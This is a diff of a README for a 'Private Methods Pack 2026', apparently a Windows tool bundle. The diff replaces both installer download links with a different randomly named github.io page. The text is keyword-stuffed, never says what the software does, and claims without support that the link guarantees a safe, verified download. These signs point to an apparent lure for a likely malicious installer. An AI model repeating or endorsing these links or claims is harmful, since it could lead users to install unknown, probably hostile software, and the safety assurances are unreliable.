@@ -2,7 +2,7 @@
 
 The Private Methods Pack 2026 is an advanced suite of tools designed for Windows desktop users seeking enhanced private methods and system optimizations. This comprehensive collection includes secret methods 2026 for various applications, providing a full private underground experience with advanced private tools in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -61,7 +61,7 @@ Here are answers to some common queries about the Private Methods Pack:
 
 For the latest version of the Private Methods Pack, including all updates and features for 2026, visit the official download page. This ensures you get the complete private collection with all advanced private tools.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link is the only official source for the installer and guarantees a safe and verified download. Avoid third-party sites to prevent security risks.
 
